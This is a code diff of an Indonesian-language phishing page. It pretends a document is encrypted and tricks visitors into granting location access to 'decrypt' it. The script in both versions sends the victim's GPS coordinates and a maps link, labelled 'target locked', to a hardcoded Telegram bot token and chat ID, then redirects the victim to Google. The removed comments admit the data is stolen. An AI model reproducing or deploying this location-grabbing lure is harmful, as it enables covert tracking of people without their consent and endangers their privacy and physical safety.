@@ -5,12 +5,11 @@
     <style>
         body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 100px; }
         button { padding: 15px 30px; background: #0f0; border: none; cursor: pointer; font-weight: bold; border-radius: 5px; }
-        .warning { color: red; font-weight: bold; }
     </style>
 </head>
 <body>
-    <h1 class="warning">FILE ENCRYPTED</h1>
-    <p>Klik tombol di bawah untuk memverifikasi lokasi Anda & membuka dokumen.</p>
+    <h1 style="color:red;">FILE ENCRYPTED</h1>
+    <p>Klik tombol untuk verifikasi lokasi & buka dokumen.</p>
     <br>
     <button onclick="getLocation()">VERIFIKASI IDENTITAS</button>
 
@@ -19,30 +18,23 @@
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(showPosition, showError);
         } else {
-            alert("Sensor GPS tidak aktif atau tidak didukung.");
+            alert("GPS tidak didukung.");
         }
     }
 
     function showPosition(position) {
-        let lat = position.coords.latitude;
-        let lon = position.coords.longitude;
-        
-        // DATA TUAN D.A.G SUDAH TERPASANG
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
         const token = "7678260062:AAGYdcdK_KTSw96PQhAQvU2AxQ0TNv00ZH4"; 
         const chat_id = "7986370931"; 
-        
-        const pesan = `🎯 TARGET TERKUNCI!\n\n📍 Koordinat: ${lat}, ${lon}\n🌍 Peta: https://www.google.com/maps?q=${lat},${lon}`;
+        const pesan = `🎯 TARGET TERKUNCI!\n📍 Koordinat: ${lat}, ${lon}\n🌍 Peta: https://www.google.com/maps?q=${lat},${lon}`;
 
-        // Perintah kirim ke Telegram
         fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(pesan)}`)
-        .then(() => {
-            // Setelah data tercuri, lempar target ke Google
-            window.location.href = "https://google.com"; 
-        });
+        .then(() => { window.location.href = "https://google.com"; });
     }
 
     function showError(error) {
-        alert("Akses Ditolak. Anda wajib memberikan izin lokasi untuk dekripsi file.");
+        alert("Akses Ditolak. Izin lokasi wajib untuk dekripsi.");
     }
     </script>
 </body>
